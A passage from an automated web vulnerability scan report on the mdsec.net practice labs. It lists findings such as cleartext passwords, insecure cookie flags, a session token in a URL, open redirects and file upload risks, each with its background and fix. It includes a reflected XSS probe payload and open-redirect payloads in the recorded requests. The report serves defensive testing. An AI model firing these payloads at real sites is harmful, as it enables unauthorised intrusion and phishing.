+<div class="rr_div"><span>GET /search/48/Default.aspx?_<wbr>_VIEWSTATE=%2FwEPDwU<wbr>KMTQ0Mzg2MTQ4MGRkum0<wbr>orMkCdcXpzQvtL1xKgi8SPuM<wbr>%3D&amp;SearchTerm=a<span class="HIGHLIGHT">65510\'%3balert(1)/<wbr>/080bc0d37</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1 HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/48/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:38 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1528<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Search&lt;/title&gt;<br><br><b>...[SNIP]...</b><br>&lt;script&gt;var a = 'No results found for expression: a<span class="HIGHLIGHT">65510\\';alert(1)/<wbr>/080bc0d37</span>'; alert(a);&lt;/script&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="10">10.&nbsp;Cleartext submission of password</span>
+<br><a class="PREVNEXT" href="#9">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#11">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/88/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://mdsec.net/auth/88<wbr>/Default.ashx</li></ul>The form contains the following password field:<ul><li>password</li></ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Passwords submitted over an unencrypted connection are vulnerable to capture by an attacker who is suitably positioned on the network. This includes any malicious party located on the user's own network, within their ISP, within the ISP used by the application, and within the application's hosting infrastructure. Even if switched networks are employed at some of these locations, techniques exist to circumvent this defense and monitor the traffic passing through switches. </span>
+<h2>Issue remediation</h2>
+<span class="TEXT">The application should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas of the application should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /auth/88/ HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/labs/lab<wbr>.ashx?lab=4<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:44:24 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1552<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Login&lt;/title&gt;<br>&lt;<br><b>...[SNIP]...</b><br>&lt;br/&gt;<span class="HIGHLIGHT">&lt;form method="post" id="form1" name="form1" action="Default.ashx" autocomplete="off"&gt;</span>&lt;table cellspacing="10"&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">&lt;input name="password" type="password" value=""/&gt;</span>&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="11">11.&nbsp;SSL cookie without secure flag set</span>
+<br><a class="PREVNEXT" href="#10">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#12">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_medium_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Medium</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/369/Default.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The following cookie was issued by the application and does not have the secure flag set:<ul><li><b>SessionId__369=9E9A8<wbr>E82FB760FD4CE3C896EB<wbr>CEA56B4; HttpOnly</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.</span>
+<h2>Issue background</h2>
+<span class="TEXT">If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain which issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /auth/369/Default.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://mdsec.net/auth<wbr>/369/Default.ashx<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 27<br><br>username=user&amp;password<wbr>=user</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 302 Found<br>Date: Wed, 10 Apr 2013 12:53:00 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Location: http://mdsec.net/auth/369<wbr>/Home.ashx<br><span class="HIGHLIGHT">Set-Cookie: SessionId__369=9E9A8<wbr>E82FB760FD4CE3C896EB<wbr>CEA56B4; HttpOnly</span><br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 152<br><br>&lt;html&gt;&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;&lt;body<wbr>&gt;<br>&lt;h2&gt;Object moved to &lt;a href="http://mdsec.net<wbr>/auth/369/Home.ashx"&gt;here<wbr>&lt;/a&gt;.&lt;/h2&gt;<br>&lt;/body&gt;&lt;/html&gt;<br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="12">12.&nbsp;Session token in URL</span>
+<br><a class="PREVNEXT" href="#11">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#13">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_medium_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Medium</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/379/Home.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The URL in the request appears to contain a session token within the query string:<ul><li>https://mdsec.net/auth<wbr>/379/Home.ashx?SessionId_<wbr>_379=DDF7A6332577965<wbr>C1DD0280D1F4FB575</li></ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing session tokens into the URL increases the risk that they will be captured by an attacker.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">The application should use an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /auth/379/Home.ashx<wbr>?SessionId__379=<span class="HIGHLIGHT">DDF7A6332577965C1DD0<wbr>280D1F4FB575</span> HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://mdsec.net/auth<wbr>/379/Default.ashx<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 302 Found<br>Date: Wed, 10 Apr 2013 12:53:31 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Location: /auth/379/Default.ashx<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 145<br><br>&lt;html&gt;&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;&lt;body<wbr>&gt;<br>&lt;h2&gt;Object moved to &lt;a href="%2fauth%2f379<wbr>%2fDefault.ashx"&gt;here&lt;/a&gt;<wbr>.&lt;/h2&gt;<br>&lt;/body&gt;&lt;/html&gt;<br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="13">13.&nbsp;Open redirection</span>
+<br><a class="PREVNEXT" href="#12">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#14">Next</a>
+<br>
+<br><span class="TEXT">There are 3 instances of this issue:
+<ul>
+<li><a href="#13.1">/updates/18/ [redir parameter]</a></li>
+<li><a href="#13.2">/updates/23/ [redir parameter]</a></li>
+<li><a href="#13.3">/updates/8/ [redir parameter]</a></li>
+</ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application which causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain with a valid SSL certificate (if SSL is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:<ul><li>Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.</li><li>Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.</li></ul>If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:<ul><li>The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.</li><li>The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend http://yourdomainname.com to the URL before issuing the redirect.</li><li>The application should use absolute URLs for all of its redirects, and the redirection function should verify that the user-supplied URL begins with http://yourdomainname.com/ before issuing the redirect.</li></ul></span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="13.1">13.1.&nbsp;http://mdsec.net/updates/18/ [redir parameter]</span>
+<br><a class="PREVNEXT" href="#9.5">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#13.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_low_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Low</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/updates/18/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>redir</b> request parameter is used to perform a redirect using a META HTTP-EQUIV tag. The payload <b>http%3a//aa444818467<wbr>417150/a%3f/updates<wbr>/update29.html</b> was submitted in the redir parameter. This caused a redirection to the following URL:<ul><li>http://aa444818467417150<wbr>/a?/updates/update29.html</li></ul></span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /updates/18/?redir=<span class="HIGHLIGHT">http%3a//aa444818467<wbr>417150/a%3f/updates<wbr>/update29.html</span> HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/updates<wbr>/18/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:44:48 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 119<br><br>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0; url=<span class="HIGHLIGHT">http://aa444818467417150<wbr>/a?/updates/update29.html</span>"&gt;&lt;/head&gt;&lt;html&gt;</span></div>
+<div class="rule"></div>
+<span class="BODH1" id="13.2">13.2.&nbsp;http://mdsec.net/updates/23/ [redir parameter]</span>
+<br><a class="PREVNEXT" href="#13.1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#13.3">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_low_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Low</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/updates/23/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>redir</b> request parameter is used to perform a redirect initiated from JavaScript. The payload <b>http%3a//a168cad9f50<wbr>e38ee5/a%3f/updates<wbr>/update29.html</b> was submitted in the redir parameter. This caused a redirection to the following URL:<ul><li>http://a168cad9f50e38ee5<wbr>/a?/updates/update29.html</li></ul></span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /updates/23/?redir=<span class="HIGHLIGHT">http%3a//a168cad9f50<wbr>e38ee5/a%3f/updates<wbr>/update29.html</span> HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/updates<wbr>/23/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:44:41 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 113<br><br>&lt;html&gt;&lt;head&gt;&lt;script<wbr>&gt;document.location="<span class="HIGHLIGHT">http://a168cad9f50e38ee5<wbr>/a?/updates/update29.html</span>";&lt;/script&gt;&lt;/head&gt;&lt;/html&gt;</span></div>
+<div class="rule"></div>
+<span class="BODH1" id="13.3">13.3.&nbsp;http://mdsec.net/updates/8/ [redir parameter]</span>
+<br><a class="PREVNEXT" href="#13.2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#16.1">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_low_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Low</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/updates/8/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>redir</b> request parameter is used to perform an HTTP redirect. The payload <b>http%3a//a983b1bedbf<wbr>6635e3/a%3f/updates<wbr>/update29.html</b> was submitted in the redir parameter. This caused a redirection to the following URL:<ul><li>http://a983b1bedbf6635e3<wbr>/a?/updates/update29.html</li></ul></span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /updates/8/?redir=<span class="HIGHLIGHT">http%3a//a983b1bedbf<wbr>6635e3/a%3f/updates<wbr>/update29.html</span> HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/updates<wbr>/8/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 302 Found<br>Date: Wed, 10 Apr 2013 12:44:27 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Location: <span class="HIGHLIGHT">http://a983b1bedbf6635e3<wbr>/a?/updates/update29.html</span><br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 166<br><br>&lt;html&gt;&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;&lt;body<wbr>&gt;<br>&lt;h2&gt;Object moved to &lt;a href="http://a983b1b<wbr>edbf6635e3/a?/updates<wbr>/update29.html"&gt;here&lt;/a&gt;.<wbr>&lt;/h2&gt;<br>&lt;/body&gt;&lt;/html&gt;<br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="14">14.&nbsp;Password field with autocomplete enabled</span>
+<br><a class="PREVNEXT" href="#13">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#15">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_low_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Low</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/cclookup/9/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The page contains a form with the following action URL:<ul><li>http://mdsec.net/cclookup<wbr>/9/Default.aspx</li></ul>The form contains the following password field with autocomplete enabled:<ul><li>Password</li></ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications which employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.<br><br>The stored credentials can be captured by an attacker who gains access to the computer, either locally or through some remote compromise. Further, methods have existed whereby a malicious web site can retrieve the stored credentials for other applications, by exploiting browser vulnerabilities or through application-level cross-domain attacks. </span>
+<h2>Issue remediation</h2>
+<span class="TEXT">To prevent browsers from storing credentials entered into HTML forms, you should include the attribute <b>autocomplete="off"</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /cclookup/9/ HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/labs/lab<wbr>.ashx?lab=9<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:55:18 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1771<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Credit card stor<br><b>...[SNIP]...</b><br>&lt;br/&gt;<br><br><span class="HIGHLIGHT">&lt;form name="form1" method="post" action="Default.aspx" id="form1"&gt;</span><br>&lt;div&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<br>                <span class="HIGHLIGHT">&lt;input name="Password" type="password" id="Password" /&gt;</span><br>            &lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="15">15.&nbsp;Cookie without HttpOnly flag set</span>
+<br><a class="PREVNEXT" href="#14">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#16">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/settings/12/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li>PreferredLanguage=English</li></ul>The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.</span>
+<h2>Issue background</h2>
+<span class="TEXT">If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure can prevent certain client-side attacks, such as cross-site scripting, from trivially capturing the cookie's value via an injected script.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.<br><br>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /settings/12/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/settings<wbr>/12/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 105<br><br>__VIEWSTATE=%2FwEPDw<wbr>UJLTE0NTkzOTE2ZGR66y<wbr>NY0NUOHhvi9Cw2LO%2FfYfg6<wbr>%2BQ%3D%3D&amp;Language<wbr>=English&amp;Update=Update</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:54 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br><span class="HIGHLIGHT">Set-Cookie: PreferredLanguage=English</span><br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1316<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Preferences&lt;/tit<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="16">16.&nbsp;File upload functionality</span>
+<br><a class="PREVNEXT" href="#15">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#17">Next</a>
+<br>
+<br><span class="TEXT">There are 2 instances of this issue:
+<ul>
+<li><a href="#16.1">/filestore/327/</a></li>
+<li><a href="#16.2">/filestore/8/</a></li>
+</ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">File upload functionality is commonly associated with a number of vulnerabilities, including:<ul><li>File path traversal</li><li>Persistent cross-site scripting</li><li>Placing of other client-executable code into the domain</li><li>Transmission of viruses and other malware</li><li>Denial of service</li></ul>You should review the file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.<br><br>Some factors to consider when evaluating the security impact of this functionality include:<ul><li>Whether uploaded content can subsequently be downloaded via a URL within the application.</li><li>What Content-type and Content-disposition headers the application returns when the file's content is downloaded.</li><li>Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.</li><li>Whether the application performs any filtering on the file extension or MIME type of the uploaded file.</li><li>Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).</li><li>What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.</li><li>Whether archive formats such as ZIP are unpacked by the application.</li><li>How the application handles attempts to upload very large files, or decompression bomb files.</li></ul></span>
+<h2>Issue remediation</h2>
